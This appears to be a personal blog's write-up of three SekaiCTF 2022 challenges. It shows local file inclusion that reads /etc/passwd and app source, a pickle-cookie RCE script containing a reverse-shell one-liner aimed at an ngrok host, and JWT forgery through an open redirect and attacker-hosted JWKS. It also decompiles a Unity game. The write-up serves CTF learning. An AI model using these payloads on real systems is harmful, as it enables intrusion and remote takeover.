@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SekaiCTF 2022 Writeup | cjxol.com</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="SekaiCTF 2022 Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Note: Some of the links to external sites about the challenge in this post might become unavailable in the future." />
+<meta property="og:description" content="Note: Some of the links to external sites about the challenge in this post might become unavailable in the future." />
+<link rel="canonical" href="https://www.cjxol.com/posts/sekaictf-2022-writeup/" />
+<meta property="og:url" content="https://www.cjxol.com/posts/sekaictf-2022-writeup/" />
+<meta property="og:site_name" content="cjxol.com" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-11T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SekaiCTF 2022 Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-11T00:00:00+01:00","datePublished":"2022-10-11T00:00:00+01:00","description":"Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.","headline":"SekaiCTF 2022 Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cjxol.com/posts/sekaictf-2022-writeup/"},"url":"https://www.cjxol.com/posts/sekaictf-2022-writeup/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cjxol.com/feed.xml" title="cjxol.com" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">cjxol.com</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">SekaiCTF 2022 Writeup</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-10-11T00:00:00+01:00" itemprop="datePublished">Oct 11, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><em>Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.</em></p>
+
+<p>This is my writeup to web challenges “<a href="https://ctf.sekai.team/challenges#Bottle-Poem-29">Bottle Poem</a>”, “<a href="https://ctf.sekai.team/challenges#Issues-33">Issues</a>” and reverse challenge “Perfect Match X-treme” in <a href="https://ctf.sekai.team/">SekaiCTF 2022</a>. I started doing the CTF when I joined a team halfway through the CTF. The exploits and skills involved in these 3 challenges in this writeup includes local file inclusion (LFI), unsafe deserialization and remote code execution (RCE), improper use of JWKS, open redirect, Unity game reversing and general/reversing tooling.</p>
+
+<p>On this page:</p>
+
+<ul>
+  <li><a href="#bottle-poem-web">Bottle Poem (Web) writeup</a></li>
+  <li><a href="#issues-web">Issues (Web) writeup</a></li>
+  <li><a href="#perfect-match-x-treme">Perfect Match X-treme (Reverse) writeup</a></li>
+</ul>
+
+<h2 id="bottle-poem-web">Bottle Poem (Web)</h2>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-index.png" alt="Bottle Poem index page." /></p>
+
+<p>In the first webpage of the challenge, there are three links to “poems in the Bottle”.</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-spring.png" alt="First poem in the Bottle." /></p>
+
+<p>Upon clicking the link, we noticed the value of the query parameter <code class="highlighter-rouge">id</code> appears to be the filename of the file to be shown. For example, the link “Spring” links to <code class="highlighter-rouge">http://bottle-poem.ctf.sekai.team/show?id=spring.txt</code>.</p>
+
+<h3 id="local-file-inclusion-and-leaking-source-code">Local File Inclusion and Leaking Source Code</h3>
+
+<p>Filename being passed into as query parameter smells like the recipe for local file inclusion (LFI). Though the challenge description states the flag is an executable, and we cannot just make the webpage to include and display the flag, we however can get more information exploiting LFI.</p>
+
+<p>To confirm LFI, we tried to pass <code class="highlighter-rouge">/etc/passwd</code> as value of <code class="highlighter-rouge">id</code> parameter, and we get content of <code class="highlighter-rouge">/etc/passwd</code> being returned.</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-passwd.png" alt="/etc/passwd leaked." /></p>
+
+<p>From the HTTP header <code class="highlighter-rouge">server: WSGIServer/0.2 CPython/3.8.12</code>, I can tell the backend is in Python. Many Python webapps in CTFs would have a <code class="highlighter-rouge">app.py</code> file as the entry point of the apps, so I tried to see if the file exists in the directory of the poem files or the parent directory, which hopefully to be the webapp’s root.</p>
+
+<p>When I tried <code class="highlighter-rouge">../app.py</code>, instead of showing “No This Poems”, it showed “No!!!!”, which means <code class="highlighter-rouge">../app.py</code> file likely exists and the author prevents us from seeing it.</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py-no.png" alt="../app.py but we cannot see it." /></p>
+
+<p>Trying with several different “files” known to normally exist on Linux, <code class="highlighter-rouge">/proc/self/cmdline</code> gave me the command runs the webapp <code class="highlighter-rouge">python3 -u /app/app.py</code>. This gave me the absolute location of <code class="highlighter-rouge">app.py</code> file.</p>
+
+<p><code class="highlighter-rouge">/app/app.py</code> worked around the restrictions when using relevant path and leaked the source code of the webapp.</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/bottle-poem-app-py.png" alt="app.py" /></p>
+
+<p>From the source code, I can see the app used Bottle web framework.</p>
+
+<h3 id="admin-and-other-distractions">Admin? And Other Distractions</h3>
+
+<p>In the function for <code class="highlighter-rouge">/sign</code>, I can see the if we do not have a session prior we will be assigned a guest session, if we have an admin session, we will have a different template rendered.</p>
+
+<p>Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from <code class="highlighter-rouge">/app/config/secret.py</code>:</p>
+
+<pre><code class="language-Python">sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
+</code></pre>
+
+<p>I then installed Bottle and used it to serve webpage that sets signed cookie with data <code class="highlighter-rouge">{"name": "admin"}</code> to obtain the admin cookie:</p>
+
+<pre><code class="language-Python">from bottle import route, run, request, response
+
+@route('/hello')
+def hello():
+    session = {"name": "admin"}
+    response.set_cookie("name", session, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
+    return "Hello World!"
+
+run(host='localhost', port=8080, debug=True)
+</code></pre>
+
+<p>The value of the admin cookie produced is <code class="highlighter-rouge">!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==</code>. I then set the cookie named <code class="highlighter-rouge">name</code> as this value, and visited <code class="highlighter-rouge">/sign</code>, however, the page shown to me was not impressive. It showed me “Hello, you are admin, but it’s useless.”</p>
+
+<p>I looked around both templates for guest and admin, which are located in <code class="highlighter-rouge">/app/views/</code>, and named <code class="highlighter-rouge">guest.html</code> and <code class="highlighter-rouge">admin.html</code> respectively. The template files are just HTML with template syntax tags. The two lines from those files appear the most interesting as they contains template variable tags:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello {{{name}}, what r u doing????
+Hello, you are {{name}}, but it’s useless.
+</code></pre></div></div>
+
+<p>I wondered if any server-side template injection (SSTI) possible here. However, it appeared the <code class="highlighter-rouge">name</code> variable passed into the template is from the session cookie’s <code class="highlighter-rouge">name</code>, and the templates only renders if the value to be “guest” or “admin”, and any other values would not work.</p>
+
+<h3 id="finding-the-exploit">Finding the Exploit</h3>
+
+<p>Bottle is a rather small framework, when I was looking into <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py">the source code of Bottle</a> to figure out how to forge the admin cookie, I noticed a deprecate warning at <a href="https://github.com/bottlepy/bottle/blob/99341ff3791b2e7e705d7373e71937e9018eb081/bottle.py#L1850">line 1850</a> about pickling of arbitrary objects into cookies. I did some search and find this rather old <a href="https://github.com/bottlepy/bottle/issues/900">issue</a> from 2016 regarding the security of using pickle to deserialize cookie values, which causes remote code execution (RCE).</p>
+
+<p>Our team crafted a similar payload as the cookie value based on this exploit and got the flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+import base64
+import os
+import hmac
+import hashlib
+
+class RCE:
+    def __reduce__(self):
+        cmd = """
+            python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16526));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+        """
+        return os.system, (cmd,)
+
+def gen_cookie(payload):
+    b64pld = base64.b64encode(payload)
+    signature = base64.b64encode(
+        hmac.new(
+            b"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu", b64pld, hashlib.md5
+        ).digest()
+    )
+    return b'"!' + signature + b"?" + b64pld + b'"'
+
+if __name__ == "__main__":
+    pickled = pickle.dumps(RCE())
+    print(gen_cookie(pickled))
+</code></pre></div></div>
+
+<h3 id="bottle-poem-conclusion">Bottle Poem Conclusion</h3>
+
+<p>In this challenge we exploited LFI to leak information including the source of the webapp, and use of insecure deprecated features of unsafe deserialization in the framework which leads to RCE.</p>
+
+<h2 id="issues-web">Issues (Web)</h2>
+
+<p>This challenge has a downloadable, which contains the source of the challenge. Examining the source, it has an <code class="highlighter-rouge">app.py</code> and an <code class="highlighter-rouge">api.py</code> file contains the most interesting part of the challenge. In <code class="highlighter-rouge">app.py</code>, it has a <code class="highlighter-rouge">/.well-known/jwks.json</code> endpoint which returns a pre-defined JSON Web Key Set (JWKS). The flag is in a text file, and <code class="highlighter-rouge">/api/flag</code> endpoint would return the content of the file. However, the flag api endpoint requires authorization to access.</p>
+
+<p>Looking into the authorization code, it checks bearer tokens in header. The token is a JSON Web Token (JWT), and the public key used to verify the token is from the issuer defined in JWT token, grabbed with <code class="highlighter-rouge">requests.get(url)</code>. Thus, we could use our own public and private key pair to sign the JWT, and point the issuer to somewhere we have control thus provides our own public key for the app to verify the token.</p>
+
+<p>Is it that easy though? Before getting the public key, it checks if the issuer is from <code class="highlighter-rouge">localhost:8080</code> with <code class="highlighter-rouge">urlparse(issuer).netloc</code>. With this check, we can no longer point the issuer to anything we want other than <code class="highlighter-rouge">localhost:8080</code>. I tried to exploit <code class="highlighter-rouge">urlparse</code> to bypass the restriction, however, it did not seem would work (though not relevant, during the research, I learned that <code class="highlighter-rouge">urlparse</code> has interesting behaviour when returning hostnames e.g. <a href="https://bugs.python.org/issue36338">this report on Python bug tracker</a>, and <a href="https://security.snyk.io/vuln/SNYK-JS-URLPARSE-2407759">Python has this issue as described in this CVE for the Node.js package too</a>).</p>
+
+<p>When I reviewed the challenge code again, I noticed the <code class="highlighter-rouge">/logout</code> endpoint has an redirect after clearing the session, which defaults to <code class="highlighter-rouge">home</code>, however it does not do any check on the <code class="highlighter-rouge">redirect</code> parameter if given, and would redirect to whatever is passed onto. This is vulnerable to open redirect. I used this open redirect endpoint to bypass the restriction on issuer, crafted issuer <code class="highlighter-rouge">http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a=</code>, which results in the app requests JWKS from my own server.</p>
+
+<h3 id="crafting-the-final-payload">Crafting the Final Payload</h3>
+
+<p>Generate RSA private and public key:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa -out rsa.private 512
+openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
+</code></pre></div></div>
+
+<p>Make <code class="highlighter-rouge">jwks.json</code> to be served with HTTP server:</p>
+
+<pre><code class="language-JSON">{
+    "keys": [
+        {
+            "alg": "RS256",
+            "x5c": [
+                "&lt;content of public key&gt;"
+            ]
+        }
+    ]
+}
+</code></pre>
+
+<p>Generate the admin token:</p>
+
+<pre><code class="language-Python">import jwt
+
+private_key = open('rsa.private').read()
+
+print(jwt.encode({'user': 'admin'}, private_key, 'RS256', {'issuer': 'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a='})
+</code></pre>
+
+<p>The token looks like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
+</code></pre></div></div>
+
+<p>Request <code class="highlighter-rouge">/api/flag</code> endpoint with the authorization header using the token:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9teS1zZXJ2ZXIuZXhhbXBsZS5jb20vLndlbGxfa25vd24vandrcy5qc29uJmE9In0.eyJ1c2VyIjoiYWRtaW4ifQ.quNOTqf6U7kBTFlK32Nm9QhLL9IkRvtsdnfFm8Ct_Cgr8CCjrIc-H-o3oaKJ_UnEVzsizx4BTlFZJQEuXTkB6w
+</code></pre></div></div>
+
+<p>Get flag <code class="highlighter-rouge">SEKAI{v4l1d4t3_y0ur_i55u3r_plz}</code>.</p>
+
+<h3 id="issues-conclusion">Issues Conclusion</h3>
+
+<p>I exploited the use of JWKS and open redirect in the challenge.</p>
+
+<h2 id="perfect-match-x-treme">Perfect Match X-treme</h2>
+
+<p>This challenge has a downloadable, which contains a Unity game. The game looks similar to Perfect Match minigame in Fall Guys: Ultimate Knockout (https://youtu.be/edifg0uMzxU). The gameplay is to remember the fruits the tiles corresponding to in each round, and stand on the tiles matching the fruit shown on the screen at the end of the round to progress into the next round.</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-game.png" alt="Challenge screenshot." /></p>
+
+<p>However, in the third round of the challenge game, it always shows the SekaiCTF logo on the screen, and no tiles matches. Thus, we cannot finish the game through normal gameplay to finish the game.</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-eliminated.png" alt="Eliminated screen." /></p>
+
+<p>Examining the files, and reading <a href="https://github.com/imadr/Unity-game-hacking">some guide</a>, I identified <code class="highlighter-rouge">/PerfectMatch_Data/Managed/Assembly-CSharp.dll</code> would be the interesting file that contains the game’s logic (<code class="highlighter-rouge">Assembly-UnityScript.dll</code> would be interesting too if it exists according to the guide).</p>
+
+<p>The next step is to use decompiler for .NET or Unity. I tried to decompile the DLL file with dotPeak, ILSpy and dnSpyEx, and they all worked. I used primarily <a href="https://github.com/dnSpyEx/dnSpy">dnSpyEx</a> during this challenge.</p>
+
+<p>Opening the DLL in dnSpyEx, <code class="highlighter-rouge">GameManager</code> contains the logic of choosing fruits for each round. Browsing around content in the DLL, I find the code for showing the flag is in UI. The screenshot of the content of the decompiled DLL and content of UI is shown below:</p>
+
+<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-decompile-ui.png" alt="Decompiled Assembly-UnityScript.dll content." /></p>
+
+<p>The flag appeared to be 3 pieces of text putting together, I guessed it could be 3 pieces of strings stored in some data file, which might be <code class="highlighter-rouge">/PerfectMatch_Data/level0</code>. To check further, I used <code class="highlighter-rouge">grep -r "SEKAI{" .</code>, and it returned <code class="highlighter-rouge">grep: ./PerfectMatch_Data/level0: binary file matches</code>. Then I used <code class="highlighter-rouge">strings</code> to extract the strings of the flag, and find this part of the output looks like the strings for the flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEKAI{F4LL_GUY5_
+fff?fff?
+Qualified!
+1LL3G4L}
+H3CK_15_
+</code></pre></div></div>
+
+<p>Putting the 3 parts together, got the flag <code class="highlighter-rouge">SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}</code>.</p>
+
+  </div><a class="u-url" href="/posts/sekaictf-2022-writeup/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">cjxol.com</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">cjxol.com</li><li><a class="u-email" href="mailto:i@cjxol.com">i@cjxol.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/allc"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">allc</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
